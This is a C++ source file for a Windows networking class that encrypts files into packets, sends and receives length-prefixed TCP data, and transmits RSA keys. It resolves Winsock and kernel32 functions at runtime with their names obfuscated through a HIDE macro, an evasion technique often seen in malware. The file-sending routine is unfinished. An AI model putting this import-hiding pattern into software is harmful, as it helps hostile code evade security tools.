#include "NetworkManager.h"
#include "ProcessManager.h"
#include "ext/obfuscate.h"

#include <vector>

bool NetworkManager::SendFile(File& file, SOCKET s, BYTESTRING& aesKey) {
    std::cout << "Were going to try and send a file. " << std::endl;

    const int   packetBufferSize = MAX_BUFFER_LEN - 20; // Comfortable buffer size, dont wanna fill it fully
    std::string contents         = file.ReadFrom();
    ULONG       fileSize         = file.GetFileSize();
    ULONG       readBytes        = 0; // out of 'toRead' how many bytes have been read from contents
    int         packetsToSend    = std::ceil(file.GetFileSize() / (double)packetBufferSize ); /* Leave some room to be safe */ 
    int         packets          = 0; // packets sent
    Packet      toSend;
    BYTESTRING  grouped; // grouped and encrypted packets

    auto start = std::chrono::high_resolution_clock::now();

    /*
        Takes ~460ms to send a 100 MB file without standard output :(
    */
    while ( readBytes < fileSize ) // while we still need to read
    {
        //std::cout << "Read bytes: " << readBytes << std::endl;
        //std::cout << "Packets sent: " << packets << std::endl;
        
        if ( readBytes + packetBufferSize >= fileSize )
            toSend.insert(std::string(contents.begin() + readBytes, contents.end()));
        else
            toSend.insert(std::string(contents.begin() + readBytes, contents.begin() + readBytes + packetBufferSize));

        packets++;
        readBytes += toSend.buffLen;

        BYTESTRING encrypted = LGCrypto::EncryptStruct<Packet>(toSend, aesKey, LGCrypto::GenerateAESIV());
        grouped.insert(grouped.end(), encrypted.begin(), encrypted.end());
    }

    auto end = std::chrono::high_resolution_clock::now();
    auto dur = end - start;
    long long final = std::chrono::duration_cast<std::chrono::milliseconds>(dur).count();

    std::cout << "Read bytes: " << readBytes << std::endl;
    std::cout << "Sent over " << packets << " packets" << std::endl;
    std::cout << "Size of all encrypted packets " << grouped.size() << std::endl;
    std::cout << "Took " << final << " ms" << std::endl;

    // Todo: send tcp large data to 's'
}

bool NetworkManager::SendTCPLargeData(const BYTESTRING& message, SOCKET s) {
    if ( !IsTCPSocket(s) ) return false;

    int toSend = message.size();
    int bytesSent = 0;

    int sent = Send(s, ( char* ) &toSend, sizeof(toSend), 0);
    if ( sent <= 0 )
        return false;

    while ( bytesSent < toSend ) {
        sent = Send(s, ( char* ) message.data() + bytesSent, toSend - bytesSent, 0);

        if ( sent <= 0 )
            return false;

        bytesSent += sent;
    }
    return true;
}

bool NetworkManager::ReceiveTCPLargeData(BYTESTRING& data, SOCKET s)
{
    if ( !IsTCPSocket(s) ) return false;

    int toReceive = 0;
    BYTESTRING buffer;
    int bytesReceived = 0;

    int received = Receive(s, ( char* ) &toReceive, sizeof(toReceive), 0);

    if ( received <= 0 )
        return false;

    buffer.resize(toReceive);

    while ( bytesReceived < toReceive ) {
        received = Receive(s, ( char* ) buffer.data() + bytesReceived, toReceive - bytesReceived, 0);

        if ( received <= 0 )
            return false;

        bytesReceived += received;
    }
    data = buffer;
    return true;
}

bool NetworkManager::TransmitRSAKey(SOCKET s, RSA* key, bool isPrivateKey) {
    if ( !key )
        return false;

    DER format = LGCrypto::RSAKeyToDer(key, isPrivateKey);
    if ( Send(s, ( char* ) &format.len, sizeof(format.len), 0) <= 0 )
        return false;
    
    if ( Send(s, ( char* ) format.data, format.len, 0) <= 0 )
        return false;

    return true;
}

bool NetworkManager::IsTCPSocket(SOCKET s) {
    int type, optLen;
    optLen = sizeof(type);

    GetSocketOptions(s, SOL_SOCKET, SO_TYPE, ( char* ) &type, &optLen);
    if ( type == SOCK_STREAM )
        return true;

    return false;
}

NetworkManager::NetworkManager() {
    if ( this->m_WSAInitialized )
        return;

#ifdef SERVER_RELEASE
    if ( !DllsLoaded ) {
        Kernel32DLL = LoadLibraryA("kernel32.dll");
        NTDLL = LoadLibraryA("ntdll.dll");
        AdvApi32DLL = LoadLibraryA("advapi32.dll");
        DllsLoaded = true;
    }
#endif

    // load winsock and kernel32 libraries

    HMODULE WINSOCK = ProcessManager::GetFunctionAddress<_LoadLibrary>(Kernel32DLL, std::string(HIDE("LoadLibraryA")))( ( char* ) HIDE("Ws2_32.dll") );

    //// function pointers from winsock
    StartWSA = ProcessManager::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
    BindSocket = ProcessManager::GetFunctionAddress<_bind>(WINSOCK, std::string(HIDE("bind")));
    CloseSocket = ProcessManager::GetFunctionAddress<_closesocket>(WINSOCK, std::string(HIDE("closesocket")));
    CreateSocket = ProcessManager::GetFunctionAddress<_socket>(WINSOCK, std::string(HIDE("socket")));
    Receive = ProcessManager::GetFunctionAddress<_recv>(WINSOCK, std::string(HIDE("recv")));
    SendTo = ProcessManager::GetFunctionAddress<_sendto>(WINSOCK, std::string(HIDE("sendto")));
    ReceiveFrom = ProcessManager::GetFunctionAddress<_recvfrom>(WINSOCK, std::string(HIDE("recvfrom")));
    Send = ProcessManager::GetFunctionAddress<_send>(WINSOCK, std::string(HIDE("send")));
    CleanWSA = ProcessManager::GetFunctionAddress<_WSACleanup>(WINSOCK, std::string(HIDE("WSACleanup")));
    ConnectSocket = ProcessManager::GetFunctionAddress<_connect>(WINSOCK, std::string(HIDE("connect")));
    SocketListen = ProcessManager::GetFunctionAddress<_listen>(WINSOCK, std::string(HIDE("listen")));
    ShutdownSocket = ProcessManager::GetFunctionAddress<_shutdown>(WINSOCK, std::string(HIDE("shutdown")));
    AcceptOnSocket = ProcessManager::GetFunctionAddress<_accept>(WINSOCK, std::string(HIDE("accept")));
    HostToNetworkShort = ProcessManager::GetFunctionAddress<_htons>(WINSOCK, std::string(HIDE("htons")));
    InternetAddress = ProcessManager::GetFunctionAddress<_inet_addr>(WINSOCK, std::string(HIDE("inet_addr")));
    GetHostByName = ProcessManager::GetFunctionAddress<_gethostbyname>(WINSOCK, std::string(HIDE("gethostbyname")));
    HostToNetworkLong = ProcessManager::GetFunctionAddress<_htonl>(WINSOCK, std::string(HIDE("htonl")));
    NetworkToHostLong = ProcessManager::GetFunctionAddress<_ntohl>(WINSOCK, std::string(HIDE("ntohl")));
    SetSocketOptions = ProcessManager::GetFunctionAddress<_setsocketopt>(WINSOCK, std::string(HIDE("setsockopt")));
    GetSocketOptions = ProcessManager::GetFunctionAddress<_getsocketopt>(WINSOCK, std::string(HIDE("getsockopt")));

    WORD    version = MAKEWORD(2, 2);
    WSAData data = { 0 };

    if ( StartWSA(version, &data) == 0 ) {
        this->m_WSAInitialized = true;
    }
}

void NetworkManager::SetSocketTimeout(SOCKET s, int timeoutMS, int type) {
    SetSocketOptions(s, SOL_SOCKET, type, ( char* ) &timeoutMS, sizeof(timeoutMS));
}

void NetworkManager::ResetSocketTimeout(SOCKET s, int type) {
    SetSocketTimeout(s, 0, type);
}